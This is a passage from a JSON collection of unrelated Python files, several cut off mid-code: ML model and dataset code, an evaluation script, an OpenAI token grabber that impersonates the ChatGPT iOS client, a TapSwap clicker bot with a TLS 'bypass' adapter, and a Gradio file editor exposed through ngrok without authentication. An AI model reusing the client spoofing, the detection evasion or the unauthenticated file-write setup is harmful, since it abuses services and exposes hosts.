\"\u5361\u6d1b\u7433\", 0, None)\n    \u6d77\u56e0\u91cc\u5e0c = ConfigItem(\"SkillLevel\", \"\u6d77\u56e0\u91cc\u5e0c\", 0, None)\n\n    \u4e03\u53f7\u81ea\u7531\u6e2f\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"7\u53f7\u81ea\u7531\u6e2f\", 0, None)\n    \u6f84\u660e\u6570\u636e\u4e2d\u5fc3\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u6f84\u660e\u6570\u636e\u4e2d\u5fc3\", 0, None)\n    \u963f\u59ae\u5854\u6218\u5907\u5de5\u5382\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u963f\u59ae\u5854\u6218\u5907\u5de5\u5382\", 0, None)\n    \u963f\u59ae\u5854\u80fd\u6e90\u7814\u7a76\u6240\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u963f\u59ae\u5854\u80fd\u6e90\u7814\u7a76\u6240\", 0, None)\n    \u6dd8\u91d1\u4e50\u56ed\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u6dd8\u91d1\u4e50\u56ed\", 0, None)\n    \u66fc\u5fb7\u77ff\u573a\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u66fc\u5fb7\u77ff\u573a\", 0, None)\n    \u8352\u539f\u7ad9\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u8352\u539f\u7ad9\", 0, None)\n    \u94c1\u76df\u54e8\u7ad9\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u94c1\u76df\u54e8\u7ad9\", 0, None)\n    \u4fee\u683c\u91cc\u57ce\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u4fee\u683c\u91cc\u57ce\", 0, None)\n    \u963f\u59ae\u5854\u53d1\u5c04\u4e2d\u5fc3\u780d\u62ac\u6b21\u6570 = ConfigItem(\"NegotiatePrice\", \"\u963f\u59ae\u5854\u53d1\u5c04\u4e2d\u5fc3\", 0, None)\n    buyTired = ConfigItem(\"NegotiatePrice\", \"buyTired\", 8, None)\n    sellTired = ConfigItem(\"NegotiatePrice\", \"sellTired\", 8, None)\n\n    \u4e03\u53f7\u81ea\u7531\u6e2f\u58f0\u671b = ConfigItem(\"StationLevel\", \"7\u53f7\u81ea\u7531\u6e2f\", 0, None)\n    \u6f84\u660e\u6570\u636e\u4e2d\u5fc3\u58f0\u671b = ConfigItem(\"StationLevel\", \"\u6f84\u660e\u6570\u636e\u4e2d\u5fc3\", 0, None)\n    \u66fc\u5fb7\u77ff\u573a\u58f0\u671b = ConfigItem(\"StationLevel\", \"\u66fc\u5fb7\u77ff\u573a\", 0, None)\n    \u4fee\u683c\u91cc\u57ce\u58f0\u671b = ConfigItem(\"StationLevel\", \"\u4fee\u683c\u91cc\u57ce\", 0, None)\n    \u963f\u59ae\u5854\u53d1\u5c04\u4e2d\u5fc3\u58f0\u671b = ConfigItem(\"StationLevel\", \"\u963f\u59ae\u5854\u53d1\u5c04\u4e2d\u5fc3\", 0, None)\n",
    "# Adapted from https://github.com/guoyww/AnimateDiff/blob/main/animatediff/models/unet_blocks.py\n\nfrom collections import OrderedDict\nfrom dataclasses import dataclass\nimport pdb\nfrom os import PathLike\nfrom pathlib import Path\nfrom typing import Dict, List, Optional, Tuple, Union\n\nimport torch\nimport torch.nn as nn\nimport torch.utils.checkpoint\nimport torch.nn.functional as F\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\nfrom diffusers.models.attention_processor import AttentionProcessor\nfrom diffusers.models.embeddings import TimestepEmbedding, Timesteps\nfrom diffusers.models.modeling_utils import ModelMixin\nfrom diffusers.utils import SAFETENSORS_WEIGHTS_NAME, WEIGHTS_NAME, BaseOutput, logging\nfrom safetensors.torch import load_file\n\nfrom .resnet import InflatedConv3d, InflatedGroupNorm\nfrom .unet_3d_blocks import UNetMidBlock3DCrossAttn, get_down_block, get_up_block\n\nlogger = logging.get_logger(__name__)  # pylint: disable=invalid-name\n\n\n@dataclass\nclass UNet3DConditionOutput(BaseOutput):\n    sample: torch.FloatTensor\n\n\nclass UNet3DConditionModel(ModelMixin, ConfigMixin):\n    _supports_gradient_checkpointing = True\n\n    @register_to_config\n    def __init__(\n        self,\n        sample_size: Optional[int] = None,\n        in_channels: int = 4,\n        out_channels: int = 4,\n        center_input_sample: bool = False,\n        flip_sin_to_cos: bool = True,\n        freq_shift: int = 0,\n        down_block_types: Tuple[str] = (\n            \"CrossAttnDownBlock3D\",\n            \"CrossAttnDownBlock3D\",\n            \"CrossAttnDownBlock3D\",\n            \"DownBlock3D\",\n        ),\n        mid_block_type: str = \"UNetMidBlock3DCrossAttn\",\n        up_block_types: Tuple[str] = (\n            \"UpBlock3D\",\n            \"CrossAttnUpBlock3D\",\n            \"CrossAttnUpBlock3D\",\n            \"CrossAttnUpBlock3D\",\n        ),\n        only_cross_attention: Union[bool, Tuple[bool]] = False,\n        block_out_channels: Tuple[int] = (320, 640, 1280, 1280),\n        layers_per_block: int = 2,\n        downsample_padding: int = 1,\n        mid_block_scale_factor: float = 1,\n        act_fn: str = \"silu\",\n        norm_num_groups: int = 32,\n        norm_eps: float = 1e-5,\n        cross_attention_dim: int = 1280,\n        attention_head_dim: Union[int, Tuple[int]] = 8,\n        dual_cross_attention: bool = False,\n        use_linear_projection: bool = False,\n        class_embed_type: Optional[str] = None,\n        num_class_embeds: Optional[int] = None,\n        upcast_attention: bool = False,\n        resnet_time_scale_shift: str = \"default\",\n        use_inflated_groupnorm=False,\n        # Additional\n        use_motion_module=False,\n        motion_module_resolutions=(1, 2, 4, 8),\n        motion_module_mid_block=False,\n        motion_module_decoder_only=False,\n        motion_module_type=None,\n        motion_module_kwargs={},\n        unet_use_cross_frame_attention=None,\n        unet_use_temporal_attention=None,\n    ):\n        super().__init__()\n\n        self.sample_size = sample_size\n        time_embed_dim = block_out_channels[0] * 4\n\n        # input\n        self.conv_in = InflatedConv3d(\n            in_channels, block_out_channels[0], kernel_size=3, padding=(1, 1)\n        )\n\n        # time\n        self.time_proj = Timesteps(block_out_channels[0], flip_sin_to_cos, freq_shift)\n        timestep_input_dim = block_out_channels[0]\n\n        self.time_embedding = TimestepEmbedding(timestep_input_dim, time_embed_dim)\n\n        # class embedding\n        if class_embed_type is None and num_class_embeds is not None:\n            self.class_embedding = nn.Embedding(num_class_embeds, time_embed_dim)\n        elif class_embed_type == \"timestep\":\n            self.class_embedding = TimestepEmbedding(timestep_input_dim, time_embed_dim)\n        elif class_embed_type == \"identity\":\n            self.class_embedding = nn.Identity(time_embed_dim, time_embed_dim)\n        else:\n            self.class_embedding = None\n\n        self.down_blocks = nn.ModuleList([])\n        self.mid_block = None\n        self.up_blocks = nn.ModuleList([])\n\n        if isinstance(only_cross_attention, bool):\n            only_cross_attention = [only_cross_attention] * len(down_block_types)\n\n        if isinstance(attention_head_dim, int):\n            attention_head_dim = (attention_head_dim,) * len(down_block_types)\n\n        # down\n        output_channel = block_out_channels[0]\n        for i, down_block_type in enumerate(down_block_types):\n            res = 2**i\n            input_channel = output_channel\n            output_channel = block_out_channels[i]\n            is_final_block = i == len(block_out_channels) - 1\n\n            down_block = get_down_block(\n                down_block_type,\n                num_layers=layers_per_block,\n                in_channels=input_channel,\n                out_channels=output_channel,\n                temb_channels=time_embed_dim,\n                add_downsample=not is_final_block,\n                resnet_eps=norm_eps,\n                resnet_act_fn",
    "import torch\nfrom torch.utils.data import Sampler, ConcatDataset\n\n\nclass RandomConcatSampler(Sampler):\n    \"\"\" Random sampler for ConcatDataset. At each epoch, `n_samples_per_subset` samples will be draw from each subset\n    in the ConcatDataset. If `subset_replacement` is ``True``, sampling within each subset will be done with replacement.\n    However, it is impossible to sample data without replacement between epochs, unless bulding a stateful sampler lived along the entire training phase.\n    \n    For current implementation, the randomness of sampling is ensured no matter the sampler is recreated across epochs or not and call `torch.manual_seed()` or not.\n    Args:\n        shuffle (bool): shuffle the random sampled indices across all sub-datsets.\n        repeat (int): repeatedly use the sampled indices multiple times for training.\n            [arXiv:1902.05509, arXiv:1901.09335]\n    NOTE: Don't re-initialize the sampler between epochs (will lead to repeated samples)\n    NOTE: This sampler behaves differently with DistributedSampler.\n          It assume the dataset is splitted across ranks instead of replicated.\n    TODO: Add a `set_epoch()` method to fullfill sampling without replacement across epochs.\n          ref: https://github.com/PyTorchLightning/pytorch-lightning/blob/e9846dd758cfb1500eb9dba2d86f6912eb487587/pytorch_lightning/trainer/training_loop.py#L373\n    \"\"\"\n    def __init__(self,\n                 data_source: ConcatDataset,\n                 n_samples_per_subset: int,\n                 subset_replacement: bool=True,\n                 shuffle: bool=True,\n                 repeat: int=1,\n                 seed: int=None):\n        if not isinstance(data_source, ConcatDataset):\n            raise TypeError(\"data_source should be torch.utils.data.ConcatDataset\")\n        \n        self.data_source = data_source\n        self.n_subset = len(self.data_source.datasets)\n        self.n_samples_per_subset = n_samples_per_subset\n        self.n_samples = self.n_subset * self.n_samples_per_subset * repeat\n        self.subset_replacement = subset_replacement\n        self.repeat = repeat\n        self.shuffle = shuffle\n        self.generator = torch.manual_seed(seed)\n        assert self.repeat >= 1\n        \n    def __len__(self):\n        return self.n_samples\n    \n    def __iter__(self):\n        indices = []\n        # sample from each sub-dataset\n        for d_idx in range(self.n_subset):\n            low = 0 if d_idx==0 else self.data_source.cumulative_sizes[d_idx-1]\n            high = self.data_source.cumulative_sizes[d_idx]\n            if self.subset_replacement:\n                rand_tensor = torch.randint(low, high, (self.n_samples_per_subset, ),\n                                            generator=self.generator, dtype=torch.int64)\n            else:  # sample without replacement\n                len_subset = len(self.data_source.datasets[d_idx])\n                rand_tensor = torch.randperm(len_subset, generator=self.generator) + low\n                if len_subset >= self.n_samples_per_subset:\n                    rand_tensor = rand_tensor[:self.n_samples_per_subset]\n                else: # padding with replacement\n                    rand_tensor_replacement = torch.randint(low, high, (self.n_samples_per_subset - len_subset, ),\n                                                            generator=self.generator, dtype=torch.int64)\n                    rand_tensor = torch.cat([rand_tensor, rand_tensor_replacement])\n            indices.append(rand_tensor)\n        indices = torch.cat(indices)\n        if self.shuffle:  # shuffle the sampled dataset (from multiple subsets)\n            rand_tensor = torch.randperm(len(indices), generator=self.generator)\n            indices = indices[rand_tensor]\n\n        # repeat the sampled indices (can be used for RepeatAugmentation or pure RepeatSampling)\n        if self.repeat > 1:\n            repeat_indices = [indices.clone() for _ in range(self.repeat - 1)]\n            if self.shuffle:\n                _choice = lambda x: x[torch.randperm(len(x), generator=self.generator)]\n                repeat_indices = map(_choice, repeat_indices)\n            indices = torch.cat([indices, *repeat_indices], 0)\n        \n        assert indices.shape[0] == self.n_samples\n        return iter(indices.tolist())\n",
    "from datasets import load_dataset, load_from_disk\nfrom transformers import AutoTokenizer, AutoModel, AutoModelForCausalLM, TextStreamer\nfrom huggingface_hub import hf_hub_download\nfrom rwkv.model import RWKV\nfrom rwkv.utils import PIPELINE, PIPELINE_ARGS\nimport torch\nimport argparse\nimport re\nfrom openai import OpenAI\nimport anthropic\nfrom mamba_ssm.models.mixer_seq_simple import MambaLMHeadModel\nimport vertexai\nfrom vertexai.generative_models import GenerativeModel, Part, GenerationConfig\nfrom lmdeploy import pipeline, GenerationConfig, TurbomindEngineConfig\nimport json\nimport os\n\nPROJECT_ID = \"gemini-infer\"  # @param {type:\"string\"}\nLOCATION = \"us-central1\"  # @param {type:\"string\"}\n\ngeneration_config = GenerationConfig(\n    temperature=1,\n    top_p=1.0,\n    top_k=32,\n    candidate_count=1,\n    max_output_tokens=100,\n)\n\nall_labels = [\"admiration\",\n                \"amusement\",\n                \"anger\",\n                \"annoyance\",\n                \"approval\",\n                \"caring\",\n                \"confusion\",\n                \"curiosity\",\n                \"desire\",\n                \"disappointment\",\n                \"disapproval\",\n                \"disgust\",\n                \"embarrassment\",\n                \"excitement\",\n                \"fear\",\n                \"gratitude\",\n                \"grief\",\n                \"joy\",\n                \"love\",\n                \"nervousness\",\n                \"optimism\",\n                \"pride\",\n                \"realization\",\n                \"relief\",\n                \"remorse\",\n                \"sadness\",\n                \"surprise\",\n                \"neutral\"]\n\n\ndef generate_text(project_id: str, location: str, prompt: str, model) -> str:\n    # Initialize Vertex AI\n    vertexai.init(project=project_id, location=location)\n    responses = model.generate_content(prompt,\n                                       generation_config=generation_config,\n                                       stream=False)\n    for response in responses:\n        return response.text\n\ndef select_data(given_dataset, number_of_turns):\n    selected_data_list = []\n    label_to_data_dict = {}\n    for data in given_dataset:\n        if len(data['labels']) == 1:\n            cur_label = data['labels'][0]\n            if cur_label in label_to_data_dict:\n                label_to_data_dict[cur_label].append(data)\n            else:\n                label_to_data_dict[cur_label] = [data]\n    data_label_list = list(label_to_data_dict.keys())\n    selected_label_to_count = {key:0 for key in data_label_list}\n    for turn in range(number_of_turns):\n        for i, key in enumerate(data_label_list):\n            if len(label_to_data_dict[key]) > selected_label_to_count[key]:\n                selected_data_list.append(label_to_data_dict[key][selected_label_to_count[key]])\n                selected_label_to_count[key] += 1\n            else:\n                for other in range(i+1, len(data_label_list)):\n                    other_key = data_label_list[other]\n                    if len(label_to_data_dict[other_key]) > selected_label_to_count[other_key]:\n                        selected_data_list.append(label_to_data_dict[other_key][selected_label_to_count[other_key]])\n                        selected_label_to_count[other_key] += 1\n                        break\n\n    print(\"selected_data_list: \", selected_data_list)\n    print(\"selected data list length: \", len(selected_data_list))\n    return selected_data_list\n\ndef format_discovery_prompt(data_dict_list, round=0, with_instruction=False, context_token_number=\"2k\"):\n    token_shot_map_dict = {\"2k\": 73, \"5k\": 190, \"10k\": 380, \"15k\": 560, \"20k\": 740, \"25k\": 920,\n                           \"32k\": 1180}\n    prompt = 'Given a comment, please predict the emotion category of this comment. The predict answer must come from the demonstration examples with the exact format.'\n    if with_instruction:\n        prompt = prompt + 'You can only make prediction from the following categories: '\n        for i, word in enumerate(all_labels):\n            if i != len(all_labels) - 1:\n                prompt = prompt + word + ', '\n            else:\n                prompt = prompt + word + '.\\n'\n    prompt = prompt + ' The examples are as follows: \\n'\n    if round != 0:\n        index = len(data_dict_list)\n        print(f\"======={round} round running========\")\n        print(\"number of instances: \", index)\n    else:\n        index = token_shot_map_dict[context_token_number]\n    data_list = data_dict_list[:index]\n    for data in data_list:\n        prompt = prompt + \"comment: \" + data['text'] + \"\\nemotion category: \" + all_labels[data['labels'][0]] + '\\n'\n    return prompt\n\nparser = argparse.ArgumentParser(description=\"Long in-context Learning\",\n                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument(\"-c\", \"--context_length\", type=str, default='2k', help=\"number of tokens the context have\")\nparser.add_argument(\"-m\", \"--model\", type=str, help=\"model name to test\")\nparser.add_",
    "import base64\nimport hashlib\nimport json\nimport os\nimport random\nimport string\nimport time\nfrom urllib.parse import urlparse\n\nimport click\nimport requests\nfrom DrissionPage import ChromiumOptions\nfrom DrissionPage._pages.web_page import WebPage\n\n\ndef to_time(t: int = None):\n    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t))\n\n\ndef to_timestamp(t: str = None):\n    return time.strptime(t, '%Y-%m-%d %H:%M:%S') if t else time.time()\n\n\nclass TokenManager:\n    def __init__(\n            self,\n            refresh_token=None,\n            device_token=None,\n            refresh_interval=60,\n            storage_path='./token.json',\n            proxy='http://127.0.0.1:10809',\n    ):\n        self.refresh_token = refresh_token\n        self.device_token = device_token\n        self.refresh_interval = refresh_interval\n        self.access_token = None\n        self.storage_path = storage_path\n        self.co = ChromiumOptions()\n        if proxy:\n            self.co.set_proxy(proxy)\n            self.proxy = {'all': proxy}\n        else:\n            self.proxy = None\n        self.load_token()\n        self.save_token()\n\n    def get_refresh_token(self):\n        self.ensure_refresh_token()\n        return self.refresh_token\n\n    def get_access_token(self):\n        if self.is_expired():\n            self.refresh()\n        return self.access_token\n\n    def get_sess_key(self):\n        response = requests.post(\n            'https://api.openai.com/dashboard/onboarding/login',\n            headers={\n                \"Authorization\": f\"Bearer {self.get_access_token()}\",\n                \"Content-Type\": \"application/json\",\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0\",\n            },\n            proxies=self.proxy\n        )\n        if response.ok:\n            data = json.loads(response.text)\n            return {\n                'sess_key': data['user']['session']['sensitive_id'],\n                'created': to_time(data['user']['session']['created']),\n                'last_use': to_time(data['user']['session']['last_use']),\n            }\n\n    def is_expired(self):\n        if not self.access_token:\n            return True\n        payload = self.access_token.split('.')[1]\n        payload = payload + '=' * - (len(payload) % - 4)\n        exp = json.loads(base64.b64decode(payload).decode()).get('exp')\n        return exp - time.time() < 60\n\n    def refresh(self):\n        self.ensure_refresh_token()\n        self.access_token = self.generate_access_token()\n\n    def ensure_refresh_token(self):\n        if self.refresh_token:\n            return\n        code_verifier = self.generate_code_verifier()\n        code_challenge = self.generate_code_challenge(code_verifier)\n        preauth_cookie = self.get_preauth_cookie()\n        if not preauth_cookie:\n            raise Exception('\u6293\u53d6preauth_cookie\u5931\u8d25')\n        url = f'https://auth0.openai.com/authorize' \\\n              f'?client_id=pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh' \\\n              f'&audience=https%3A%2F%2Fapi.openai.com%2Fv1' \\\n              f'&redirect_uri=com.openai.chat%3A%2F%2Fauth0.openai.com%2Fios%2Fcom.openai.chat%2Fcallback' \\\n              f'&scope=openid%20email%20profile%20offline_access%20model.request%20model.read%20organization.read%20offline' \\\n              f'&response_type=code' \\\n              f'&code_challenge={code_challenge}' \\\n              f'&code_challenge_method=S256' \\\n              f'&preauth_cookie={preauth_cookie}'\n\n        url += '&prompt=login'\n        # print(url)\n        # code = input('code: ')\n        page = WebPage(chromium_options=self.co)\n        page.get(url)\n        page.listen.start('com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback')\n        res = page.listen.wait()\n        query1 = {args.split('=')[0]: args.split('=')[1] for args in urlparse(res.url).query.split('&')}\n        code = query1.get('code')\n        if not code:\n            raise Exception('preauth_cookie\u5df2\u8fc7\u671f')\n        # state = query1['state']\n        page.close()\n        resp_json = requests.post('https://auth0.openai.com/oauth/token', json={\n            'redirect_uri': 'com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback',\n            'grant_type': 'authorization_code',\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'code': code,\n            'code_verifier': code_verifier\n        }, proxies=self.proxy).json()\n        # json.dump(resp_json, open('./app.json', 'w'))\n        # print(json.dumps(resp_json, indent=2))\n        self.refresh_token = resp_json.get('refresh_token')\n        self.save_token()\n\n    def revoke_refresh_token(self, refresh_token):\n        resp = requests.post('https://auth0.openai.com/oauth/revoke', json={\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'token': refresh_token\n        }, proxies=self.proxy)\n        assert resp.status_code == 200\n        self.refresh_token = None\n        self.save",
    "from GeoHD import *\r\nimport os\r\n\r\ndef test_grid_visualization():\r\n    \"\"\"\r\n    Test grid visualization functionality.\r\n    \"\"\"\r\n    # Create output folder if it doesn't exist\r\n    folder_name = 'output'\r\n    if not os.path.exists(folder_name):\r\n        os.makedirs(folder_name)\r\n        print(f\"Folder '{folder_name}' has been created.\")\r\n    else:\r\n        print(f\"Folder '{folder_name}' already exists.\")\r\n        \r\n    # Provide test data paths\r\n    area_shapefile_path = './test_data/area.shp'\r\n    crash_shapefile_path = './test_data/crash.shp'\r\n    \r\n    # Test creating cell zones\r\n    create_cell_zones(area_shapefile_path, crash_shapefile_path)\r\n    \r\n    # Test creating hexagonal grid zones\r\n    create_hex_grid_zones(area_shapefile_path, crash_shapefile_path)\r\n    \r\n    # Test creating cell heatmap\r\n    create_cell_heatmap(area_shapefile_path, crash_shapefile_path)\r\n    \r\n    # Test creating hexagonal heatmap\r\n    create_hexagonal_heatmap(area_shapefile_path, crash_shapefile_path)\r\n\r\nif __name__ == \"__main__\":\r\n    test_grid_visualization()\r\n",
    "import gradio as gr\nimport os\nimport time\nimport ngrok\nfrom dotenv import load_dotenv\n\nload_dotenv(\".env.local\")\n\n\ndef new_file(file_name):\n    # print(file_explorer)\n    new_file_path = os.path.join(os.getcwd(), \"dev\", file_name)\n    open(new_file_path, \"w\")\n\n\ndef set_current_file(file):\n    if file is None:\n        return \"\"\n    file_content = \"\"\n    with open(file) as f:\n        file_content = f.read()\n    return file_content\n\n\ndef update_file(current_file, editor_content):\n    with open(current_file, \"w\") as f:\n        f.write(editor_content)\n    return current_file, editor_content, \"\"\n\n\nwith gr.Blocks(css=\"footer {visibility: hidden}\") as demo:\n    with gr.Row():\n        with gr.Column() as c:\n            file_explorer = gr.FileExplorer(file_count=\"single\", root_dir=\"dev\")\n            new_file_name = gr.Textbox(label=\"New File Name\")\n            new_file_button = gr.Button(\n                \"Create New File (After creating a new file, you must refresh the page to see the changes.)\"\n            )\n\n        with gr.Column():\n            code_display = gr.Code(\n                \"Select a file to start\",\n                language=\"python\",\n                label=\"Code Display (Displays file's current state, cannot edit this.)\",\n            )\n            code_editor = gr.Code(\n                \"\",\n                language=\"python\",\n                label=\"Code Editor (Enter the updated code to put in the file here.)\",\n            )\n            update_button = gr.Button(\"Update File\")\n\n    file_explorer.change(set_current_file, file_explorer, code_display)\n    update_button.click(\n        update_file,\n        [file_explorer, code_editor],\n        [file_explorer, code_display, code_editor],\n    )\n    new_file_button.click(new_file, new_file_name)\n    # with gr.Row():\n    #     save_button = gr.Button(\"Save Current File\")\n\nif __name__ == \"__main__\":\n    demo.queue()\n    listener = ngrok.forward(9000, authtoken_from_env=True)\n    print(f\"Ingress established at {listener.url()}\")\n    demo.launch(server_port=9000)\n",
    "# Copyright 2020 The HuggingFace Datasets Authors and the current dataset script contributor.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# TODO: Address all TODOs and remove all explanatory comments\n\"\"\"QuAC dataset.\"\"\"\n\n\nimport json\n\nimport datasets\n\n\n_CITATION = \"\"\"\\\n@article{choi2018quac,\n    title={Quac: Question answering in context},\n    author={Choi, Eunsol and He, He and Iyyer, Mohit and Yatskar, Mark and Yih, Wen-tau and Choi, Yejin and Liang, Percy and Zettlemoyer, Luke},\n    journal={arXiv preprint arXiv:1808.07036},\n    year={2018}\n}\n\"\"\"\n\n_DESCRIPTION = \"\"\"\\\nQuestion Answering in Context (QuAC) is a dataset for modeling, understanding, and\nparticipating in information seeking dialog. Data instances consist of an interactive\ndialog between two crowd workers: (1) a student who poses a sequence of freeform\nquestions to learn as much as possible about a hidden Wikipedia text, and (2)\na teacher who answers the questions by providing short excerpts (spans) from the text.\n\"\"\"\n\n_HOMEPAGE = \"https://quac.ai/\"\n\n# TODO: Add the licence for the dataset here if you can find it\n_LICENSE = \"\"\n\n_URLS = {\n    \"train\": \"https://s3.amazonaws.com/my89public/quac/train_v0.2.json\",\n    \"validation\": \"https://s3.amazonaws.com/my89public/quac/val_v0.2.json\",\n}\n\n\nclass Quac(datasets.GeneratorBasedBuilder):\n    \"\"\"Question Answering in Context (QuAC) is a dataset for modeling, understanding, and  participating in information seeking dialog.\"\"\"\n\n    VERSION = datasets.Version(\"1.1.0\")\n\n    BUILDER_CONFIGS = [\n        datasets.BuilderConfig(\n            name=\"quac\", version=VERSION, description=\"The QuAC dataset\"\n        ),\n    ]\n\n    def _info(self):\n        features = datasets.Features(\n            {\n                \"title\": datasets.Value(\"string\"),\n                \"section_title\": datasets.Value(\"string\"),\n                \"paragraph\": datasets.Value(\"string\"),\n                \"question\": datasets.Value(\"string\"),\n                \"answer\": datasets.Value(\"string\"),\n            }\n        )\n        return datasets.DatasetInfo(\n            description=_DESCRIPTION,\n            features=features,\n            homepage=_HOMEPAGE,\n            license=_LICENSE,\n            citation=_CITATION,\n        )\n\n    def _split_generators(self, dl_manager):\n        urls = {\"train\": _URLS[\"train\"], \"validation\": _URLS[\"validation\"]}\n        data_dir = dl_manager.download_and_extract(urls)\n        return [\n            datasets.SplitGenerator(\n                name=datasets.Split.TRAIN,\n                # These kwargs will be passed to _generate_examples\n                gen_kwargs={\n                    \"filepath\": data_dir[\"train\"],\n                    \"split\": \"train\",\n                },\n            ),\n            datasets.SplitGenerator(\n                name=datasets.Split.VALIDATION,\n                # These kwargs will be passed to _generate_examples\n                gen_kwargs={\"filepath\": data_dir[\"validation\"], \"split\": \"validation\"},\n            ),\n        ]\n\n    # method parameters are unpacked from `gen_kwargs` as given in `_split_generators`\n    def _generate_examples(self, filepath, split):\n        with open(filepath, encoding=\"utf-8\") as f:\n            data = json.load(f)[\"data\"]\n            key = 0\n            for row in data:\n                paragraph = row[\"paragraphs\"][0][\"context\"].replace(\"CANNOTANSWER\", \"\")\n                qas = row[\"paragraphs\"][0][\"qas\"]\n                qa_pairs = [(qa[\"question\"], qa[\"answers\"][0][\"text\"]) for qa in qas]\n                for (question, answer) in qa_pairs:\n                    # Yields examples as (key, example) tuples\n                    yield key, {\n                        \"title\": row[\"title\"],\n                        \"section_title\": row[\"section_title\"],\n                        \"paragraph\": paragraph,\n                        \"question\": question,\n                        \"answer\": answer,\n                    }\n                    key += 1\n",
    "import asyncio\nfrom telethon.sync import TelegramClient\nfrom telethon.sync import functions, types, events\nfrom threading import Thread\n\nimport json, requests, urllib, time, aiocron, random, ssl, psutil\n\nimport sys\n\n# -----------\nwith open('config.json') as f:\n    data = json.load(f)\n    api_id = data['api_id']\n    api_hash = data['api_hash']\n    admin = data['admin']\n    auto_upgrade = data['auto_upgrade']\n    max_charge_level = data['max_charge_level']\n    max_energy_level = data['max_energy_level']\n    max_tap_level = data['max_tap_level']\n\ndb = {\n    'click': 'on'\n}\n\nVERSION = \"1.4\"\nSTART_TIME = time.time()\n\nclient = TelegramClient('bot', api_id, api_hash, device_model=f\"TapSwap Clicker V{VERSION}\")\nclient.start()\nclient_id = client.get_me(True).user_id\n\n\nprint(\"Client is Ready ;)\")\n\nclient.send_message('tapswap_bot', f'/start r_{admin}')\n\n\n# -----------\n\nclass BypassTLSv1_3(requests.adapters.HTTPAdapter):\n    SUPPORTED_CIPHERS = [\n        \"ECDHE-ECDSA-AES128-GCM-SHA256\", \"ECDHE-RSA-AES128-GCM-SHA256\",\n        \"ECDHE-ECDSA-AES256-GCM-SHA384\", \"ECDHE-RSA-AES256-GCM-SHA384\",\n        \"ECDHE-ECDSA-CHACHA20-POLY1305\", \"ECDHE-RSA-CHACHA20-POLY1305\",\n        \"ECDHE-RSA-AES128-SHA\", \"ECDHE-RSA-AES256-SHA\",\n        \"AES128-GCM-SHA256\", \"AES256-GCM-SHA384\", \"AES128-SHA\", \"AES256-SHA\", \"DES-CBC3-SHA\",\n        \"TLS_AES_128_GCM_SHA256\", \"TLS_AES_256_GCM_SHA384\", \"TLS_CHACHA20_POLY1305_SHA256\",\n        \"TLS_AES_128_CCM_SHA256\", \"TLS_AES_256_CCM_8_SHA256\"\n    ]\n\n    def __init__(self, *args, **kwargs):\n        self.ssl_context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n        self.ssl_context.set_ciphers(':'.join(BypassTLSv1_3.SUPPORTED_CIPHERS))\n        self.ssl_context.set_ecdh_curve(\"prime256v1\")\n        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_3\n        self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3\n        super().__init__(*args, **kwargs)\n\n    def init_poolmanager(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().init_poolmanager(*args, **kwargs)\n\n    def proxy_manager_for(self, *args, **kwargs):\n        kwargs[\"ssl_context\"] = self.ssl_context\n        kwargs[\"source_address\"] = None\n        return super().proxy_manager_for(*args, **kwargs)\n\n\ndef getUrlsync():\n    return client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\nasync def getUrl():\n    return await client(\n        functions.messages.RequestWebViewRequest(\n            peer='tapswap_bot',\n            bot='tapswap_bot',\n            platform='ios',\n            from_bot_menu=False,\n            url='https://app.tapswap.ai/',\n        )\n    )\n\ndef authToken(url):\n    headers = {\n        \"accept\": \"/\",\n        \"accept-language\": \"en-US,en;q=0.9,fa;q=0.8\",\n        \"content-type\": \"application/json\",\n        \"sec-fetch-dest\": \"empty\",\n        \"sec-fetch-mode\": \"cors\",\n        \"sec-fetch-site\": \"same-site\",\n        \"x-cv\": \"1\",\n        \"X-App\": \"tapswap_server\"\n    }\n    payload = {\n        \"init_data\": urllib.parse.unquote(url).split('tgWebAppData=')[1].split('&tgWebAppVersion')[0],\n        \"referrer\":\"\"\n    }\n    response = requests.post('https://api.tapswap.ai/api/account/login', headers=headers, data=json.dumps(payload)).json()\n    \n    if auto_upgrade:\n        try:\n            Thread(target=complete_missions, args=(response, response['access_token'],)).start()\n        except:\n            pass\n        try:\n            check_update(response, response['access_token'])\n        except Exception as e:\n            print(e)\n    return response['access_token']\n\n\n\ndef complete_missions(response, auth: str):\n    missions = response['conf']['missions']\n    try:\n        completed_missions = response['account']['missions']['completed']\n    except:\n        completed_missions = 